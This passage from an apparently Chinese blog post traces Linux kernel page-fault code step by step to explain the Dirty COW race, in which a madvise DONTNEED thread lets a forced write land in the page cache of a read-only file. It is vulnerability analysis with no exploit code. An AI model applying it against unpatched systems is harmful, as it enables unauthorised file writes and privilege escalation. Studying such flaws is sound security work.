pmd_protnone(*pmd))<br><span class="hljs-number">222</span>         <span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-number">223</span>     <span class="hljs-keyword">if</span> (pmd_trans_huge(*pmd)) &#123;                                                                             .....                                                                                    <br><br><span class="hljs-number">243</span>     <span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br><span class="hljs-number">244</span> &#125;<br></code></pre></td></tr></table></figure>

<p>可以通过注释快速了解函数的作用，最后是调用 <code>follow_page_pte</code>来从页表项当中获取虚拟地址映射到的物理地址，首先我们可以知道我们第一次访问mmap所建立的物理映射的时候，他并没有体现在页表当中，而是会触发我们的PAGE FAULT处理函数，然后才是真正建立了页表的映射，所以该函数 <code>follow_page_mask</code>也必定会返回NULL值，我们同样可以通过调试来确定这一点</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/0e2442a7d933c8956746434e971373f0820200cf.jpg" srcset="/img/loading.gif" lazyload></p>
<p>接下来查看 <code>follow_page_pte</code>函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">61</span> <span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"> <span class="hljs-number">62</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br> 63 &#123;<br> <span class="hljs-number">64</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br> <span class="hljs-number">65</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br> <span class="hljs-number">66</span>     <span class="hljs-type">spinlock_t</span> *ptl;<br> <span class="hljs-number">67</span>     <span class="hljs-type">pte_t</span> *ptep, pte;<br> <span class="hljs-number">68</span> <br> <span class="hljs-number">69</span> retry:<br> <span class="hljs-number">70</span>     <span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd)))                                                        <br> <span class="hljs-number">71</span>         <span class="hljs-keyword">return</span> no_page_table(vma, flags);<br> <span class="hljs-number">72</span> <br> <span class="hljs-number">73</span>     ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br> <span class="hljs-number">74</span>     pte = *ptep;<br>	 .....<br> <span class="hljs-number">95</span>     <span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<br> <span class="hljs-number">96</span>         pte_unmap_unlock(ptep, ptl);<br> <span class="hljs-number">97</span>         <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br> <span class="hljs-number">98</span>     &#125;<br> <span class="hljs-number">99</span> <br><br></code></pre></td></tr></table></figure>

<p>由于我们mmap映射到的用户虚拟地址是第一次访问，因此还并没有在页表上面建立映射，所以这里得到的pte(page_table_entry)也必定为0</p>
<p>得知返回值为0我们继续分析 <code>__get_user_pages</code> 的retry</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-number">503</span> retry:<br> <span class="hljs-number">504</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment"> 505          * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment"> 506          * potentially allocating memory.</span><br><span class="hljs-comment"> 507          */</span><br> <span class="hljs-number">508</span>         <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br> <span class="hljs-number">509</span>             <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br> <span class="hljs-number">510</span>         cond_resched();<br> <span class="hljs-number">511</span>         page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br> <span class="hljs-number">512</span>         <span class="hljs-keyword">if</span> (!page) &#123;<br> <span class="hljs-number">513</span>             <span class="hljs-type">int</span> ret;<br> <span class="hljs-number">514</span>             ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br> <span class="hljs-number">515</span>                     nonblocking);<br>.......<br></code></pre></td></tr></table></figure>

<p>若page为0,则会调用 <code>faultin_page</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">290</span> <span class="hljs-comment">/*</span><br><span class="hljs-comment">291  * mmap_sem must be held on entry.  If @nonblocking != NULL and</span><br><span class="hljs-comment">292  * *@flags does not include FOLL_NOWAIT, the mmap_sem may be released.</span><br><span class="hljs-comment">293  * If it is, *@nonblocking will be set to 0 and -EBUSY returned.</span><br><span class="hljs-comment">294  */</span>     <br><span class="hljs-number">295</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-number">296</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>297 &#123;<br><span class="hljs-number">298</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-number">299</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br><span class="hljs-number">300</span>     <span class="hljs-type">int</span> ret;<br>	 ......<br><span class="hljs-number">310</span>     <span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE)<br><span class="hljs-number">311</span>         fault_flags |= FAULT_FLAG_WRITE;<br>	 ......<br><span class="hljs-number">320</span> <br><span class="hljs-number">321</span>     ret = handle_mm_fault(mm, vma, address, fault_flags);<br>	 ......<br><br></code></pre></td></tr></table></figure>

<p>看到这里的faultin_page函数由于你传入的标识为有 <code>FOLL_WRITE</code>，因此他给 <code>fault_flags</code>加上了 <code>FAULT_FLAG_WRITE</code>标识位，也就是说 <code>fault_flags=1</code></p>
<p>然后调用<code>handle_mm_fault-&gt;__handle_mm_fault-&gt;handle_pte_fault</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3272</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-number">3273</span>              <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,</span><br><span class="hljs-params"><span class="hljs-number">3274</span>              <span class="hljs-type">pte_t</span> *pte, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>3275 &#123;<br>		 .......<br><span class="hljs-number">3287</span>     entry = *pte;<br><span class="hljs-number">3288</span>     barrier();<br><span class="hljs-number">3289</span>     <span class="hljs-keyword">if</span> (!pte_present(entry)) &#123;<br><span class="hljs-number">3290</span>         <span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<br><span class="hljs-number">3291</span>             <span class="hljs-keyword">if</span> (vma_is_anonymous(vma))<br><span class="hljs-number">3292</span>                 <span class="hljs-keyword">return</span> do_anonymous_page(mm, vma, address,<br><span class="hljs-number">3293</span>                              pte, pmd, flags);<br><span class="hljs-number">3294</span>             <span class="hljs-keyword">else</span><br><span class="hljs-number">3295</span>                 <span class="hljs-keyword">return</span> do_fault(mm, vma, address, pte, pmd,<br><span class="hljs-number">3296</span>                         flags, entry);<br><span class="hljs-number">3297</span>         &#125;<br>		.......<br></code></pre></td></tr></table></figure>

<p>由于这是我们第一次处理缺页异常，因此这里获取到的pte是空，因此会进入下面的判断，而由于我们在创建mmap映射的时候，传递的flag参数为 <code>PROT_READ|MAP_PRIVATE</code>,所以这里并不会调用 <code>do_anonymouse_page</code>，因此会紧接着调用 <code>do_fault</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3108</span> <span class="hljs-comment">/*</span><br><span class="hljs-comment">3109  * We enter with non-exclusive mmap_sem (to exclude vma changes,</span><br><span class="hljs-comment">3110  * but allow concurrent faults).</span><br><span class="hljs-comment">3111  * The mmap_sem may have been released depending on flags and our</span><br><span class="hljs-comment">3112  * return value.  See filemap_fault() and __lock_page_or_retry().</span><br><span class="hljs-comment">3113  */</span> <br><span class="hljs-number">3114</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-number">3115</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pte_t</span> *page_table, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-number">3116</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>3117 &#123;<br><span class="hljs-number">3118</span>     <span class="hljs-type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)<br><span class="hljs-number">3119</span>             - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;<br><span class="hljs-number">3120</span> <br><span class="hljs-number">3121</span>     pte_unmap(page_table);<br><span class="hljs-number">3122</span>     <span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br><span class="hljs-number">3123</span>     <span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<br><span class="hljs-number">3124</span>         <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br><span class="hljs-number">3125</span>     <span class="hljs-keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))<br><span class="hljs-number">3126</span>         <span class="hljs-keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,<br><span class="hljs-number">3127</span>                 orig_pte);<br><span class="hljs-number">3128</span>     <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<br><span class="hljs-number">3129</span>         <span class="hljs-keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,<br><span class="hljs-number">3130</span>                 orig_pte);<br><span class="hljs-number">3131</span>     <span class="hljs-keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<br><span class="hljs-number">3132</span> &#125;<br></code></pre></td></tr></table></figure>

<p>这里可以看到，由于我们flags仅仅为 <code>FAULT_FLAG+WRITE</code>,并且我们的vmflags没有 <code>VM_SHARED</code>（这是因为我们创建映射的时候是MAP_PRIVATE，也就是私有映射），所以会调用 <code>do_cow_fault</code></p>
<p>而 <code>do_cow_fault</code>的功能首先获取一个新的页面 new_page,然后调用 <code>__do_fault</code>函数来将page cache中关于文件的映射部分复制到fault_page当中(获取fault_page体现在 <code>find_get_page</code>函数当中，他会返回我们的page cache page,这里会增加引用计数的，所以不要担心释放的问题 )，然后调用函数 <code>copy_user_highpage</code> 将fault_page的内容复制到new_page当中，最后释放fault_page，然后就开始与虚拟地址在页表当中建立映射，调用 <code>do_set_pte</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">2810</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_set_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,                      </span><br><span class="hljs-params"><span class="hljs-number">2811</span>         <span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">pte_t</span> *pte, <span class="hljs-type">bool</span> write, <span class="hljs-type">bool</span> anon)</span><br>2812 &#123;<br><span class="hljs-number">2813</span>     <span class="hljs-type">pte_t</span> entry;<br><span class="hljs-number">2814</span> <br><span class="hljs-number">2815</span>     flush_icache_page(vma, page);<br><span class="hljs-number">2816</span>     entry = mk_pte(page, vma-&gt;vm_page_prot);<br><span class="hljs-number">2817</span>     <span class="hljs-keyword">if</span> (write)<br>     		<span class="hljs-comment">/* 这里注意带了个脏位 */</span><br><span class="hljs-number">2818</span>         entry = maybe_mkwrite(pte_mkdirty(entry), vma);<br><span class="hljs-number">2819</span>     <span class="hljs-keyword">if</span> (anon) &#123;<br><span class="hljs-number">2820</span>         inc_mm_counter_fast(vma-&gt;vm_mm, MM_ANONPAGES);<br><span class="hljs-number">2821</span>         page_add_new_anon_rmap(page, vma, address);<br><span class="hljs-number">2822</span>     &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">2823</span>         inc_mm_counter_fast(vma-&gt;vm_mm, MM_FILEPAGES);<br><span class="hljs-number">2824</span>         page_add_file_rmap(page);<br><span class="hljs-number">2825</span>     &#125;   <br><span class="hljs-number">2826</span>     set_pte_at(vma-&gt;vm_mm, address, pte, entry);<br><span class="hljs-number">2827</span>         <br><span class="hljs-number">2828</span>     <span class="hljs-comment">/* no need to invalidate: a not-present page won&#x27;t be cached */</span><br><span class="hljs-number">2829</span>     update_mmu_cache(vma, address, pte);<br><span class="hljs-number">2830</span> &#125;<br></code></pre></td></tr></table></figure>

<p>由于我们传入的参数当中是写错误，所以这里会调用 <code>maybe_mkwrite</code>或者写入可写位，这里继续跟进</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">572</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">pte_t</span> <span class="hljs-title function_">maybe_mkwrite</span><span class="hljs-params">(<span class="hljs-type">pte_t</span> pte, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>                <br>573 &#123;   <br><span class="hljs-number">574</span>     <span class="hljs-keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))<br><span class="hljs-number">575</span>         pte = pte_mkwrite(pte);<br><span class="hljs-number">576</span>     <span class="hljs-keyword">return</span> pte;<br><span class="hljs-number">577</span> &#125;       <br></code></pre></td></tr></table></figure>

<p>可以看到，如果说我们的vm_flags存在可写标识，那么就会将该pte的可写位置上，否则就不管，现在大火可能懂了为什么是“或者写“了，经过这一段操作，会制造成下面这种情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03ec6fde8e923f8794a4c226f4.jpg" srcset="/img/loading.gif" lazyload></p>
<h2 id="第二次page-fault"><a href="#第二次page-fault" class="headerlink" title="第二次page fault"></a>第二次page fault</h2><p>从上面的 <code>do_cow_fault</code>函数一路返回0,然后再次到达 <code>__get_user_pages</code>函数的retry部分，再一次调用 <code>follow_page_mask</code>函数来寻找pte,当我们一路走到 <code>follow_page_pte</code>函数的时候，这时会有个判断</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">95 </span>    <span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<br><span class="hljs-symbol">96 </span>        pte_unmap_unlock(ptep, ptl);<br><span class="hljs-symbol">97 </span>        <span class="hljs-keyword">return</span> NULL;<br><span class="hljs-symbol">98 </span>    &#125;     <br></code></pre></td></tr></table></figure>

<p>我们此时传入的flags仍然带有 <code>FOLL_WRITE</code>参数，然后他会检查我们刚刚创建的pte是否有可写标识，但看我们上面的图是明显没有的，因此这里会再次返回NULL,我们即将迎来第二次page fault</p>
<p>而此次根据我们pte的标识，进入 <code>handle_page_pte</code>函数最终会走到下面这一段，调用 <code>do_wp_page</code></p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3309 </span>    <span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;                                                     <br><span class="hljs-symbol">3310 </span>        <span class="hljs-keyword">if</span> (!pte_write(entry))<br><span class="hljs-symbol">3311 </span>            <span class="hljs-keyword">return</span> do_wp_page(mm, vma, address,<br><span class="hljs-symbol">3312 </span>                    pte, pmd, ptl, entry);<br><span class="hljs-symbol">3313 </span>        entry = pte_mkdirty(entry);<br><span class="hljs-symbol">3314 </span>    &#125;<br></code></pre></td></tr></table></figure>

<p>由于我们的页面是可交换和重用的，然后会调用到下面的这一段，这一段是 <code>do_wp_page</code>的一部分</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">2330 </span>        <span class="hljs-keyword">if</span> (reuse_swap_page(old_page)) &#123;<br><span class="hljs-symbol">2331 </span>            /*<br><span class="hljs-symbol">2332 </span>             * The page is all ours.  Move it <span class="hljs-keyword">to</span> our anon_vma so<br><span class="hljs-symbol">2333 </span>             * the rmap code will <span class="hljs-keyword">not</span> search our parent <span class="hljs-keyword">or</span> siblings.<br><span class="hljs-symbol">2334 </span>             * Protected against the rmap code by the page lock.<br><span class="hljs-symbol">2335 </span>             */<br><span class="hljs-symbol">2336 </span>            page_move_anon_rmap(old_page, vma, address);<br><span class="hljs-symbol">2337 </span>            unlock_page(old_page);<br><span class="hljs-symbol">2338 </span>            <span class="hljs-keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,                     <br><span class="hljs-symbol">2339 </span>                         orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-symbol">2340 </span>        &#125;<br></code></pre></td></tr></table></figure>

<p>然后我们再看 <code>wp_page_reuse</code>函数，注意到这里的返回值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1993</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wp_page_reuse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-number">1994</span>             <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,</span><br><span class="hljs-params"><span class="hljs-number">1995</span>             <span class="hljs-type">pte_t</span> *page_table, <span class="hljs-type">spinlock_t</span> *ptl, <span class="hljs-type">pte_t</span> orig_pte,</span><br><span class="hljs-params"><span class="hljs-number">1996</span>             <span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">int</span> page_mkwrite,</span><br><span class="hljs-params"><span class="hljs-number">1997</span>             <span class="hljs-type">int</span> dirty_shared)</span><br>1998     __<span class="hljs-title function_">releases</span><span class="hljs-params">(ptl)</span><br>1999 &#123;<br>			.....<br><span class="hljs-number">2041</span>     <span class="hljs-keyword">return</span> VM_FAULT_WRITE;<br><span class="hljs-number">2042</span> &#125;<br></code></pre></td></tr></table></figure>

<p>这个返回值是关键，这里一路返回到 <code>faultin_page</code>函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">295</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-number">296</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>297 &#123;<br><br>		  ........<br><span class="hljs-number">345</span>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">346      * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment">347      * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment">348      * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment">349      * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment">350      * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment">351      * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment">352      * reCOWed by userspace write).</span><br><span class="hljs-comment">353      */</span><br><span class="hljs-number">354</span>     <span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br><span class="hljs-number">355</span>         *flags &amp;= ~FOLL_WRITE;<br><span class="hljs-number">356</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">357</span> &#125;<br><br></code></pre></td></tr></table></figure>

<p>可以看到他是将我们传递的flags的 <code>FOLL_WRITE</code>标志位给去掉了，还记得我们最初的标志位吗 <code>FOLL_GET|FOLL_WRITE|FOLL_FORCE</code></p>
<p>然后我们继续返回0,此时再一次准备 <code>__get_user_pages</code>的 <code>retry</code>部分，但是这里注意，我们的第二个线程实际上在悄悄偷跑，接下来就真正涉及到了条件竞争的利用</p>
<h2 id="第三次page-fault"><a href="#第三次page-fault" class="headerlink" title="第三次page fault"></a>第三次page fault</h2><p>由於這是我們再一次到達__get_user_pages函數的retry,如下</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">503 </span>retry:<br><span class="hljs-symbol">504 </span>        /*<br><span class="hljs-symbol">505 </span>         * <span class="hljs-keyword">If</span> we have a pending SIGKILL, don<span class="hljs-comment">&#x27;t keep faulting pages and</span><br><span class="hljs-symbol">506 </span>         * potentially allocating memory.<br><span class="hljs-symbol">507 </span>         */<br><span class="hljs-symbol">508 </span>        <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-symbol">509 </span>            <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br><span class="hljs-symbol">510 </span>        cond_resched();<br><span class="hljs-symbol">511 </span>        page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br><span class="hljs-symbol">512 </span>        <span class="hljs-keyword">if</span> (!page) &#123;<br><span class="hljs-symbol">513 </span>            <span class="hljs-keyword">int</span> ret;<br><span class="hljs-symbol">514 </span>            ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br><span class="hljs-symbol">515 </span>                    nonblocking);<br><span class="hljs-symbol">516 </span>            switch (ret) &#123;<br><span class="hljs-symbol">517 </span>            case <span class="hljs-number">0</span>:<br><span class="hljs-symbol">518 </span>                <span class="hljs-keyword">goto</span> retry;<br><span class="hljs-symbol">519 </span>            case -EFAULT:<br><span class="hljs-symbol">520 </span>            case -ENOMEM:<br></code></pre></td></tr></table></figure>

<p>這裏有一個 <code>cond_resched</code>函數，該函數會將CPU交給寧外一個任務，這裏就導致了我們的條件競爭，如果說這裏我們的第二各線程調用madvise系統調用，並帶上 <code>DONTNEED</code>參數，他會將對應的內存映射解除，所謂映射解除，也就僅僅是將我們的pte解除綁定而已，如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/e850352ac65c10385d6ff6f4f4119313b07e89f6.jpg" srcset="/img/loading.gif" lazyload></p>
<p>然後我們繼續進入 <code>follow_page_mask-&gt;follow_page_pte</code>函數，此時我們可以知道map映射是存在pte的，且標誌位爲 <code>rdonly和dirty</code>，並且我們訪問的flags由於消除掉了 <code>FOLL_WRITE</code>，這樣會導致他變爲 <code>FOLL_GET|FOLL_FORCE</code>,並且注意這裏的pte PRSENT位也消失掉，這是因爲你物理映射都沒了，你這個pte也應該標識爲沒用，所以這裏我們的 <code>follow_page_mask</code>函數仍然返回空，這裏會進入到第三次缺頁錯誤，調用 <code>faultin_page</code>函數</p>
<p>但是這一次的page fault同之前有區別，區別在與我們的flags並不帶上 <code>FOLL_WRITE</code>，這裏說明了並不是寫操作，那除了寫不就是read?</p>
<p>實際情況跟我們想得一樣，我們會依次調用</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">faultin<span class="hljs-emphasis">_page</span><br><span class="hljs-emphasis">	handle_mm_fault</span><br><span class="hljs-emphasis">		__handle_mm_fault</span><br><span class="hljs-emphasis">			handle_pte_fault</span><br><span class="hljs-emphasis">				do_fault</span><br><span class="hljs-emphasis">					do_read_</span>fault<br></code></pre></td></tr></table></figure>

<p>而既然我們現在是寫轉讀，內核發現這是各讀請求，那就沒必要進行COW,直接將page cache中對應文件的page頁面直接返回，然後我們再次回到 <code>__get_user_pages</code>函數，此時返回的page直接就是我們的page cache,然後再調用kmap來在內核進行映射，然後緊接着進行 <code>__access_remote_vm</code>的過程</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/63d9f2d3572c11df7c758715252762d0f703c264.jpg" srcset="/img/loading.gif" lazyload></p>
<p>這樣當我們寫操作直接將會寫入page cache,並且在最後會由於 <code>kernel page table</code>的頁表項存在髒位，這也會導致在某次磁盤同步的時候將對應修改的文件寫會到磁盤，這也導致了我們對於一個僅僅可讀的文件寫入的Dirty COW漏洞</p>
